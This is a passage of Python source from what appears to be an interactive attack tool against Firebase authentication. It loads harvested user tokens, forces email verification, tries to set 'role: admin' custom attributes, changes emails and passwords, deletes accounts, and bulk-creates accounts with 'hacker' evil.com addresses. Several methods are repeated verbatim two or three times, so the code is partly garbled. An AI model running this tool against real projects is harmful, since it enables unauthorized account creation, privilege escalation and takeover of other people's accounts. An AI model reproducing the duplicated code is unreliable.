                        print(f"{Colors.FAIL}[!] This file contains a list of users. Please provide a JSON file for a single user that includes an 'id_token'.{Colors.ENDC}")
                        continue # To re-display the _test_account_modification menu
                    
                    if not isinstance(user_data, dict):
                        print(f"{Colors.FAIL}[!] Invalid JSON format. Expected a single user object.{Colors.ENDC}")
                        continue # To re-display the _test_account_modification menu

                    id_token = user_data.get('id_token')
                    email = user_data.get('email', 'Unknown') 
                    user_id = user_data.get('user_id', user_data.get('localId', 'Unknown')) # Consolidate user_id fetching
                    refresh_token = user_data.get('refresh_token') # Get refresh token if available

                    if not id_token: # Check if id_token is None or empty
                        print(f"{Colors.FAIL}[!] The selected file for user '{email}' does not contain a valid 'id_token', which is required for these tests.{Colors.ENDC}")
                        continue # To re-display the _test_account_modification menu
                    
                    user_creds = {
                        "email": email,
                        "user_id": user_id,
                        "id_token": id_token,
                        "refresh_token": refresh_token, # Store it
                        "password": user_data.get("password", "Unknown") # Store password if available
                    }
                    print(f"{Colors.GREEN}[✓] Loaded credentials for user: {user_creds.get('email', 'Unknown')}{Colors.ENDC}")
                    # Successfully loaded, break from this inner choice handling and proceed to _interactive_modification
                    break 

                except FileNotFoundError:
                    print(f"{Colors.FAIL}[!] File not found: {token_file_path}{Colors.ENDC}")
                    continue # To re-display menu
                except json.JSONDecodeError:
                    print(f"{Colors.FAIL}[!] Invalid JSON in file: {token_file_path}{Colors.ENDC}")
                    continue # To re-display menu
                except Exception as e:
                    print(f"{Colors.FAIL}[!] Failed to load token file: {e}{Colors.ENDC}")
                    continue # To re-display menu

            elif choice == "2":
                email_input = input(f"{Colors.BOLD}[+] Enter email for new test user (random if empty): {Colors.ENDC}").strip()
                if not email_input:
                    email_input = f"mod_test_{int(time.time())}@example.com"
                password_input = input(f"{Colors.BOLD}[+] Enter password for new test user (default: ModTestPass123!): {Colors.ENDC}").strip()
                if not password_input:
                    password_input = "ModTestPass123!"
                
                # signup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}" # Not needed here, _create_test_user handles it
                created_user_data = self._create_test_user(email_input, password_input, api_key) 
                if created_user_data and 'idToken' in created_user_data:
                    user_creds = {
                        "email": email_input,
                        "password": password_input,
                        "user_id": created_user_data.get('localId'),
                        "id_token": created_user_data.get('idToken'),
                        "refresh_token": created_user_data.get('refreshToken')
                    }
                    print(f"{Colors.GREEN}[✓] Created test user: {email_input}{Colors.ENDC}")
                    # Successfully created, break from this inner choice handling and proceed
                    break
                else:
                    print(f"{Colors.FAIL}[!] Failed to create test user.{Colors.ENDC}")
                    continue # To re-display menu

            elif choice == "3": # New option: Select from previously found users
                found_files = []
                patterns_to_check = ["firebase_user_*.json", "firebase_enum_user_*.json", "firebase_db_user_*.json"]
                for pattern in patterns_to_check:
                    found_files.extend(glob.glob(pattern))

                if not found_files:
                    print(f"{Colors.WARNING}[!] No previously saved user files found matching patterns: {', '.join(patterns_to_check)}.{Colors.ENDC}")
                    continue

                displayable_users = []
                for filepath in found_files:
                    try:
                        with open(filepath, 'r') as f:
                            data = json.load(f)
                        
                        if isinstance(data, dict): # Ensure it's a single user record
                            email = data.get('email', 'N/A')
                            user_id = data.get('user_id', data.get('localId', 'N/A'))
                            # Only add if it seems like a valid single user record with potential token
                            if data.get('id_token') or 'email' in data: # Heuristic: has token or at least email
                                displayable_users.append({'filepath': filepath, 'email': email, 'user_id': user_id, 'data': data})
                        # Silently skip lists or other formats for this specific selection menu
                    except json.JSONDecodeError:
                        print(f"{Colors.WARNING}[!] Skipping invalid JSON file: {filepath}{Colors.ENDC}")
                    except Exception as e:
                        print(f"{Colors.WARNING}[!] Error processing file {filepath}: {e}{Colors.ENDC}")

                if not displayable_users:
                    print(f"{Colors.WARNING}[!] No suitable single-user files found to select from.{Colors.ENDC}")
                    continue

                print(f"\n{Colors.CYAN}[*] Available User Files:{Colors.ENDC}")
                for i, user_info_item in enumerate(displayable_users, 1):
                    print(f"  {i}. {user_info_item['email']} (User ID: {user_info_item['user_id']}, File: {os.path.basename(user_info_item['filepath'])})")
                
                try:
                    selection = input(f"{Colors.BOLD}[+] Select user file to load (1-{len(displayable_users)}): {Colors.ENDC}").strip()
                    selected_idx = int(selection) - 1
                    if not (0 <= selected_idx < len(displayable_users)):
                        raise ValueError("Selection out of range.")
                    
                    selected_file_info = displayable_users[selected_idx]
                    chosen_filepath = selected_file_info['filepath']
                    loaded_data = selected_file_info['data'] # Use already loaded data
                                   
                    id_token = loaded_data.get('id_token')
                    email = loaded_data.get('email', 'Unknown')
                    user_id = loaded_data.get('user_id', loaded_data.get('localId', 'Unknown'))
                    refresh_token = loaded_data.get('refresh_token')
                    password = loaded_data.get('password')

                    if not id_token:
                        print(f"{Colors.FAIL}[!] User record from '{os.path.basename(chosen_filepath)}' for '{email}' does not contain a valid 'id_token'. Cannot proceed with modification tests.{Colors.ENDC}")
                        continue
                    
                    user_creds = {
                        'email': email, 
                        'user_id': user_id, 
                        'id_token': id_token, 
                        'refresh_token': refresh_token, 
                        'password': password, 
                        'source_file': os.path.basename(chosen_filepath)
                    }
                    print(f"{Colors.GREEN}[✓] Loaded credentials for user: {email} from {os.path.basename(chosen_filepath)}{Colors.ENDC}")
                    break # Proceed to _interactive_modification

                except (ValueError, IndexError):
                    print(f"{Colors.FAIL}[!] Invalid selection.{Colors.ENDC}")
                    continue
            
            elif choice == "4": # Renumbered: Back to previous menu
                return # Exit _test_account_modification method

            else:
                print(f"{Colors.FAIL}[!] Invalid choice.{Colors.ENDC}")
                # Loop continues, re-displaying menu

        # This part is reached if choice "1" or "2" was successful and broke the inner loop
        if user_creds:
            self._interactive_modification(user_creds, api_key)
        # If user_creds is still None here, it means something went wrong or user chose to exit.
        # The loop in _exploit_user_registration will handle showing its menu again.

    def _interactive_modification(self, user_creds: Dict, api_key: str) -> None:
        id_token = user_creds.get('id_token')
        email = user_creds.get('email')

        if not id_token:
            print(f"{Colors.FAIL}[!] No ID token found for user {email}. Cannot proceed.{Colors.ENDC}")
            return

        print(f"\n{Colors.CYAN}[*] Interactive Modification for User: {email}{Colors.ENDC}")
        
        while True:
            print(f"\n{Colors.CYAN}Modification Options for {email}:{Colors.ENDC}")
            print("1. Modify Display Name")
            print("2. Modify Photo URL")
            print("3. Modify Password (requires current password if known, or tests unauth change)")
            print("4. Attempt to verify email (if unverified)")
            print("5. Modify Custom Attributes (if supported)")
            print("6. Attempt to change Email Address")
            print("7. Test Account Deletion")
            print("8. Refresh ID Token (if refresh token available)")
            print("9. Back to previous menu")

            mod_choice = input(f"{Colors.BOLD}[+] Select modification (1-9): {Colors.ENDC}").strip()
            success = False

            if mod_choice == "1":
                success = self._modify_display_name(id_token, api_key)
            elif mod_choice == "2":
                success = self._modify_photo_url(id_token, api_key)
            elif mod_choice == "3":
                success = self._modify_password(id_token, api_key)
            elif mod_choice == "4":
                success = self._modify_email_verification(id_token, api_key)
            elif mod_choice == "5":
                success = self._modify_custom_attributes(id_token, api_key)
            elif mod_choice == "6":
                success = self._modify_email_address(id_token, api_key)
            elif mod_choice == "7":
                if self._delete_account_test(id_token, api_key):
                    print(f"{Colors.GREEN}[✓] Account deletion test successful.{Colors.ENDC}")
                    return
                else:
                    print(f"{Colors.FAIL}[!] Account deletion test failed.{Colors.ENDC}")
            elif mod_choice == "8":
                refresh_token = user_creds.get('refresh_token')
                if refresh_token:
                    new_id_token = self._refresh_id_token(refresh_token, api_key)
                    if new_id_token:
                        id_token = new_id_token
                        user_creds['id_token'] = new_id_token
                        print(f"{Colors.GREEN}[✓] ID Token refreshed successfully.{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Failed to refresh ID Token.{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] No refresh token available for this user.{Colors.ENDC}")
            elif mod_choice == "9":
                break
            else:
                print(f"{Colors.FAIL}[!] Invalid modification choice.{Colors.ENDC}")

            if success and mod_choice not in ["7", "8", "9"]:
                print(f"{Colors.GREEN}[✓] Modification successful. Consider re-fetching user profile to see changes.{Colors.ENDC}")


    def _modify_display_name(self, id_token: str, api_key: str) -> bool:
        new_name = input(f"{Colors.BOLD}[+] Enter new display name: {Colors.ENDC}").strip()
        if not new_name:
            print(f"{Colors.WARNING}[!] Display name cannot be empty.{Colors.ENDC}")
            return False
        
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "displayName": new_name, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Display name updated successfully.{Colors.ENDC}")
            # Potentially update id_token from response.json().get('idToken')
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_photo_url(self, id_token: str, api_key: str) -> bool:
        new_url = input(f"{Colors.BOLD}[+] Enter new photo URL: {Colors.ENDC}").strip()
        if not new_url:
            print(f"{Colors.WARNING}[!] Photo URL cannot be empty.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "photoUrl": new_url, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Photo URL updated successfully.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_password(self, id_token: str, api_key: str) -> bool:
        new_password = input(f"{Colors.BOLD}[+] Enter new password: {Colors.ENDC}").strip()
        if len(new_password) < 6: # Firebase default minimum
            print(f"{Colors.WARNING}[!] Password should be at least 6 characters.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "password": new_password, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Password updated successfully.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] User will need to re-authenticate with the new password. Current id_token might be invalidated soon.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_custom_attributes(self, id_token: str, api_key: str) -> bool:
        print(f"{Colors.CYAN}[*] Custom attributes are typically set via Admin SDKs.{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] This test will attempt to set a simple custom attribute via user update endpoint.{Colors.ENDC}")
        attr_key = input(f"{Colors.BOLD}[+] Enter custom attribute key (e.g., 'role'): {Colors.ENDC}").strip()
        attr_value = input(f"{Colors.BOLD}[+] Enter custom attribute value (e.g., 'admin'): {Colors.ENDC}").strip()
        if not attr_key or not attr_value:
            print(f"{Colors.WARNING}[!] Attribute key and value cannot be empty.{Colors.ENDC}")
            return False

        custom_attributes = json.dumps({attr_key: attr_value}) # Must be a JSON string
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "customAttributes": custom_attributes, "returnSecureToken": True}
        
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            # Firebase usually returns the customAttributes as a stringified JSON.
            # And it often doesn't reflect immediately or is only settable by admin SDK.
            print(f"{Colors.GREEN}[✓] Request to update custom attributes sent. Verification needed by checking user profile.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response: {response.json().get('customAttributes', 'Not in response.')}{Colors.ENDC}")
            return True # Request was successful, actual change needs verification
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_email_address(self, id_token: str, api_key: str) -> bool:
        new_email = input(f"{Colors.BOLD}[+] Enter new email address: {Colors.ENDC}").strip()
        if not new_email or "@" not in new_email:
            print(f"{Colors.WARNING}[!] Invalid email address.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "email": new_email, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Email address change request sent.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] This usually requires verification of the new email. Current id_token might be for the old email.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response email: {response.json().get('email')}{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _delete_account_test(self, id_token: str, api_key: str) -> bool:
        """Tests if an account can be deleted with its own ID token."""
        if input(f"{Colors.RED}[!] CONFIRM: Attempt to delete account for token {id_token[:20]}...? (yes/NO): {Colors.ENDC}").lower() != 'yes':
            return False
            
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        data = {"idToken": id_token}
        response = self.session.post(delete_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Account deletion successful (HTTP 200).{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Account deletion failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _refresh_id_token(self, refresh_token: str, api_key: str) -> Optional[str]:
        """Refresca un ID token usando un refresh token."""
        refresh_endpoint = f"https://securetoken.googleapis.com/v1/token?key={api_key}"
        data = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token
        }
        response = self.session.post(refresh_endpoint, data=data)  # ¡OJO! Aquí se usa `data=`, no `json=`
        if response.status_code == 200:
            token_data = response.json()
            return token_data.get("id_token")
        else:
            print(f"{Colors.FAIL}[!] No se pudo refrescar el token: {response.status_code} - {response.text}{Colors.ENDC}")
            return None

    def _decode_and_show_token(self, id_token: str) -> None:
        """Decodifica un JWT y muestra los claims."""
        try:
            payload_b64 = id_token.split('.')[1]
            # Añade padding si es necesario
            payload_b64 += '=' * (-len(payload_b64) % 4)
            decoded_bytes = base64.urlsafe_b64decode(payload_b64)
            payload = json.loads(decoded_bytes)
            print(f"{Colors.CYAN}[*] JWT Claims:{Colors.ENDC}")
            for k, v in payload.items():
                print(f"  {k}: {v}")
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error al decodificar el token: {e}{Colors.ENDC}")


    def _modify_display_name(self, id_token: str, api_key: str) -> bool:
        new_name = input(f"{Colors.BOLD}[+] Enter new display name: {Colors.ENDC}").strip()
        if not new_name:
            print(f"{Colors.WARNING}[!] Display name cannot be empty.{Colors.ENDC}")
            return False
        
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "displayName": new_name, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Display name updated successfully.{Colors.ENDC}")
            # Potentially update id_token from response.json().get('idToken')
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_photo_url(self, id_token: str, api_key: str) -> bool:
        new_url = input(f"{Colors.BOLD}[+] Enter new photo URL: {Colors.ENDC}").strip()
        if not new_url:
            print(f"{Colors.WARNING}[!] Photo URL cannot be empty.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "photoUrl": new_url, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Photo URL updated successfully.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_password(self, id_token: str, api_key: str) -> bool:
        new_password = input(f"{Colors.BOLD}[+] Enter new password: {Colors.ENDC}").strip()
        if len(new_password) < 6: # Firebase default minimum
            print(f"{Colors.WARNING}[!] Password should be at least 6 characters.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "password": new_password, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Password updated successfully.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] User will need to re-authenticate with the new password. Current id_token might be invalidated soon.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_email_verification(self, id_token: str, api_key: str) -> bool:
        """Intenta marcar el email como verificado, luego refresca el token y muestra el resultado."""
        print(f"{Colors.CYAN}[*] Intentando marcar email como verificado...{Colors.ENDC}")
        
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {
            "idToken": id_token,
            "emailVerified": True,
            "returnSecureToken": True
        }
        response = self.session.post(update_endpoint, json=data)
        
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Email marcado como verificado (según respuesta del servidor).{Colors.ENDC}")
            refresh_token = response.json().get("refreshToken")
            if refresh_token:
                new_id_token = self._refresh_id_token(refresh_token, api_key)
                if new_id_token:
                    self._decode_and_show_token(new_id_token)
                    return True
                else:
                    print(f"{Colors.WARNING}[!] No se pudo refrescar el token para confirmar el cambio.{Colors.ENDC}")
            else:
                print(f"{Colors.WARNING}[!] No se obtuvo un refresh_token para renovar el ID token.{Colors.ENDC}")
            return True
        else:
            print(f"{Colors.FAIL}[!] Falló la verificación del email: {response.status_code} - {response.text}{Colors.ENDC}")
            return False

    def _modify_custom_attributes(self, id_token: str, api_key: str) -> bool:
        print(f"{Colors.CYAN}[*] Custom attributes are typically set via Admin SDKs.{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] This test will attempt to set a simple custom attribute via user update endpoint.{Colors.ENDC}")
        attr_key = input(f"{Colors.BOLD}[+] Enter custom attribute key (e.g., 'role'): {Colors.ENDC}").strip()
        attr_value = input(f"{Colors.BOLD}[+] Enter custom attribute value (e.g., 'admin'): {Colors.ENDC}").strip()
        if not attr_key or not attr_value:
            print(f"{Colors.WARNING}[!] Attribute key and value cannot be empty.{Colors.ENDC}")
            return False

        custom_attributes = json.dumps({attr_key: attr_value}) # Must be a JSON string
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "customAttributes": custom_attributes, "returnSecureToken": True}
        
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            # Firebase usually returns the customAttributes as a stringified JSON.
            # And it often doesn't reflect immediately or is only settable by admin SDK.
            print(f"{Colors.GREEN}[✓] Request to update custom attributes sent. Verification needed by checking user profile.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response: {response.json().get('customAttributes', 'Not in response.')}{Colors.ENDC}")
            return True # Request was successful, actual change needs verification
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_email_address(self, id_token: str, api_key: str) -> bool:
        new_email = input(f"{Colors.BOLD}[+] Enter new email address: {Colors.ENDC}").strip()
        if not new_email or "@" not in new_email:
            print(f"{Colors.WARNING}[!] Invalid email address.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "email": new_email, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Email address change request sent.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] This usually requires verification of the new email. Current id_token might be for the old email.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response email: {response.json().get('email')}{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _delete_account_test(self, id_token: str, api_key: str) -> bool:
        """Tests if an account can be deleted with its own ID token."""
        if input(f"{Colors.RED}[!] CONFIRM: Attempt to delete account for token {id_token[:20]}...? (yes/NO): {Colors.ENDC}").lower() != 'yes':
            return False
            
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        data = {"idToken": id_token}
        response = self.session.post(delete_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Account deletion successful (HTTP 200).{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Account deletion failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_display_name(self, id_token: str, api_key: str) -> bool:
        new_name = input(f"{Colors.BOLD}[+] Enter new display name: {Colors.ENDC}").strip()
        if not new_name:
            print(f"{Colors.WARNING}[!] Display name cannot be empty.{Colors.ENDC}")
            return False
        
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "displayName": new_name, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Display name updated successfully.{Colors.ENDC}")
            # Potentially update id_token from response.json().get('idToken')
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_photo_url(self, id_token: str, api_key: str) -> bool:
        new_url = input(f"{Colors.BOLD}[+] Enter new photo URL: {Colors.ENDC}").strip()
        if not new_url:
            print(f"{Colors.WARNING}[!] Photo URL cannot be empty.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "photoUrl": new_url, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Photo URL updated successfully.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_password(self, id_token: str, api_key: str) -> bool:
        new_password = input(f"{Colors.BOLD}[+] Enter new password: {Colors.ENDC}").strip()
        if len(new_password) < 6: # Firebase default minimum
            print(f"{Colors.WARNING}[!] Password should be at least 6 characters.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "password": new_password, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Password updated successfully.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] User will need to re-authenticate with the new password. Current id_token might be invalidated soon.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_custom_attributes(self, id_token: str, api_key: str) -> bool:
        print(f"{Colors.CYAN}[*] Custom attributes are typically set via Admin SDKs.{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] This test will attempt to set a simple custom attribute via user update endpoint.{Colors.ENDC}")
        attr_key = input(f"{Colors.BOLD}[+] Enter custom attribute key (e.g., 'role'): {Colors.ENDC}").strip()
        attr_value = input(f"{Colors.BOLD}[+] Enter custom attribute value (e.g., 'admin'): {Colors.ENDC}").strip()
        if not attr_key or not attr_value:
            print(f"{Colors.WARNING}[!] Attribute key and value cannot be empty.{Colors.ENDC}")
            return False

        custom_attributes = json.dumps({attr_key: attr_value}) # Must be a JSON string
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "customAttributes": custom_attributes, "returnSecureToken": True}
        
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            # Firebase usually returns the customAttributes as a stringified JSON.
            # And it often doesn't reflect immediately or is only settable by admin SDK.
            print(f"{Colors.GREEN}[✓] Request to update custom attributes sent. Verification needed by checking user profile.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response: {response.json().get('customAttributes', 'Not in response.')}{Colors.ENDC}")
            return True # Request was successful, actual change needs verification
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_email_address(self, id_token: str, api_key: str) -> bool:
        new_email = input(f"{Colors.BOLD}[+] Enter new email address: {Colors.ENDC}").strip()
        if not new_email or "@" not in new_email:
            print(f"{Colors.WARNING}[!] Invalid email address.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "email": new_email, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Email address change request sent.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] This usually requires verification of the new email. Current id_token might be for the old email.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response email: {response.json().get('email')}{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _delete_account_test(self, id_token: str, api_key: str) -> bool:
        """Tests if an account can be deleted with its own ID token."""
        if input(f"{Colors.RED}[!] CONFIRM: Attempt to delete account for token {id_token[:20]}...? (yes/NO): {Colors.ENDC}").lower() != 'yes':
            return False
            
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        data = {"idToken": id_token}
        response = self.session.post(delete_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Account deletion successful (HTTP 200).{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Account deletion failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _create_single_user(self, endpoint: str, api_key: str) -> None:
        """Create a single user account"""
        print(f"\n{Colors.CYAN}[*] Creating Single User Account{Colors.ENDC}")
        
        email = input(f"{Colors.BOLD}[+] Enter email (or press Enter for random): {Colors.ENDC}").strip()
        if not email:
            email = f"hacker{int(time.time())}@evil.com"
            
        password = input(f"{Colors.BOLD}[+] Enter password (default: HackerPass123!): {Colors.ENDC}").strip()
        if not password:
            password = "HackerPass123!"
        
        display_name = input(f"{Colors.BOLD}[+] Enter display name (optional): {Colors.ENDC}").strip()
        
        # Determine data format based on endpoint
        if "v1/accounts" in endpoint:
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            if display_name:
                user_data["displayName"] = display_name
        else:  # v3 endpoint
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            if display_name:
                user_data["displayName"] = display_name
        
        try:
            print(f"{Colors.CYAN}[*] Creating user: {email}{Colors.ENDC}")
            response = self.session.post(endpoint, json=user_data, timeout=10)
            
            if response.status_code == 200:
                user_info = response.json()
                user_id = user_info.get('localId', 'Unknown')
                id_token = user_info.get('idToken', '')
                refresh_token = user_info.get('refreshToken', '')
                
                print(f"{Colors.GREEN}[✓] User created successfully!{Colors.ENDC}")
                print(f"    Email: {email}")
                print(f"    User ID: {user_id}")
                print(f"    ID Token: {id_token[:50]}...")
                print(f"    Refresh Token: {refresh_token[:50]}...")
                
                # Save credentials to file
                creds_file = f"firebase_user_{user_id}.json"
                creds_data = {
                    "email": email,
                    "password": password,
                    "user_id": user_id,
                    "id_token": id_token,
                    "refresh_token": refresh_token,
                    "created_at": time.time(),
                    "endpoint": endpoint
                }
                
                with open(creds_file, 'w') as f:
                    json.dump(creds_data, f, indent=2)
                    
                print(f"{Colors.GREEN}[✓] Credentials saved to: {creds_file}{Colors.ENDC}")
                
            else:
                print(f"{Colors.FAIL}[!] Failed to create user: {response.status_code}{Colors.ENDC}")
                print(f"    Response: {response.text}")
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error creating user: {e}{Colors.ENDC}")

    def _create_bulk_users(self, endpoint: str, api_key: str) -> None:
        """Create multiple user accounts"""
        print(f"\n{Colors.CYAN}[*] Bulk User Creation{Colors.ENDC}")
        
        try:
            count = int(input(f"{Colors.BOLD}[+] How many users to create (1-50): {Colors.ENDC}"))
            if count < 1 or count > 50:
                print(f"{Colors.FAIL}[!] Invalid count{Colors.ENDC}")
                return
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid number{Colors.ENDC}")
            return
        
        domain = input(f"{Colors.BOLD}[+] Email domain (default: evil.com): {Colors.ENDC}").strip()
        if not domain:
            domain = "evil.com"
        
        password_base = input(f"{Colors.BOLD}[+] Password base (default: HackerPass): {Colors.ENDC}").strip()
        if not password_base:
            password_base = "HackerPass"
        
        created_users = []
        timestamp = int(time.time())
        
        print(f"\n{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")
        
        for i in range(count):
            email = f"bulk{timestamp}_{i}@{domain}"
            password = f"{password_base}{i}123!"
            
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            
            try:
                response = self.session.post(endpoint, json=user_data, timeout=5)
                
                if response.status_code == 200:
                    user_info = response.json()
                    user_id = user_info.get('localId', 'Unknown')
                    created_users.append({
                        "email": email,
                        "password": password,
                        "user_id": user_id,
                        "id_token": user_info.get('idToken', ''),
                        "refresh_token": user_info.get('refreshToken', '')
                    })
                    print(f"{Colors.GREEN}[✓] Created: {email} (ID: {user_id}){Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[✗] Failed: {email} - {response.status_code}{Colors.ENDC}")
                    
            except Exception as e:
                print(f"{Colors.FAIL}[✗] Error creating {email}: {e}{Colors.ENDC}")
            
            # Small delay to avoid rate limiting
            time.sleep(0.5)
        
        # Save all created users
        if created_users:
            bulk_file = f"firebase_bulk_users_{timestamp}.json"
            with open(bulk_file, 'w') as f:
                json.dump(created_users, f, indent=2)
            
            print(f"\n{Colors.GREEN}[✓] Created {len(created_users)} users{Colors.ENDC}")
            print(f"[✓] Credentials saved to: {bulk_file}{Colors.ENDC}")

    def _create_admin_user(self, endpoint: str, api_key: str) -> None:
        """Attempt to create an admin-like user"""
